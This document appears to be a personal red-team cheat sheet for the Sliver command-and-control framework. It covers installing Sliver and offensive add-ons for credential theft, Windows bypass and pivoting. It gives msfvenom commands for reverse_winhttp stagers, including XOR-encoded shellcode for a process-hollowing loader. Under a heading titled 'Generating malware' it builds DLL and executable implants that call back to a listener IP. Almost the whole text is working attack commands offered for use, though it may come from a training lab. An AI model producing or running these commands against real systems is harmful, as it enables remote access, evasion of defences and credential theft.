# Install Guide:


- Run the following command, sliver install complete
```bash
curl https://sliver.sh/install|sudo bash 
systemctl start sliver
systemctl enable sliver
```

- Run the following to install tooling:
```bash
sliver
armory install cs-remote-ops-bofs
armory install kerberos
armory install situational-awareness
armory install windows-bypass
armory install windows-credentials
armory install windows-pivot
armory install .net-execute
armory install .net-recon
armory install .net-pivot
armory install cs-remote-ops-bofs
armory install c2-tool-collection
```


# Stagers


```bash
# Set -a 386 for word macros
profiles new --mtls ip:443 --format shellcode win-shellcode

mtls -l 443

stage-listener --url http://ip:8443 --profile win-shellcode --prepend-size

generate stager --lhost ip --lport 8443 --protocol http 

# the above will likely not work so try the following:
# Adjust the format as needed, common formats: exe, raw, csharp, vbapplication. x86 for macros
msfvenom -a x64 -p windows/x64/custom/reverse_winhttp LHOST=tun0 LPORT=8443 LURI=/payload.woff -f exe -o sliverstage.exe EXITFUNC=thread


# Use this with hollowghost
msfvenom -p windows/x64/custom/reverse_winhttp LHOST=tun0 LPORT=8443 EXITFUNC=thread LURI=/payload.woff -f csharp --encrypt xor --encrypt-key z -i 20 | tr -d '\n\r'
```

# Generating malware
```bash

# DLL
generate -e -f shared -m 192.168.45.249:443 -R

# executable
generate  -e -f exe -m 192.168.45.249:443 

# For beacons add `beacon` at the beginning and `-S` for timeout and `-J` for jitter
```